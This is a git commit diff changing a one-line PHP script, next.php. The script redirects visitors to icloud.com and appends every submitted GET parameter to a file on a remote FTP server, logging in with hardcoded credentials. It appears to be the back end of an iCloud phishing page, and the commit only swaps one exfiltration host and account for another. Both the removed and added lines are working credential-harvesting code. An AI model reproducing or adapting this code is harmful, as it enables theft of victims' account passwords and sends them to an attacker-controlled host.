befbb4c88f45e852c22e58ed5356a982281b3d41
codeteksistemas <58203899+codeteksistemas@users.noreply.github.com>
2020-12-16 03:50:11 -0500

    new161220

--- next.php
+++ next.php
@@ -1,2 +1,2 @@
-<?php header("Location:http://www.icloud.com"); $handle = fopen("ftp://icloudpass20:codetek10@ftp.webcindario.com/web/index.html", "a"); foreach($_GET as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n");  
+<?php header("Location:http://www.icloud.com"); $handle = fopen("ftp://capturasmanzana:acceso20@files.000webhost.com/public_html/index.html", "a"); foreach($_GET as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "\r\n");  
 fclose($handle); exit; ?>
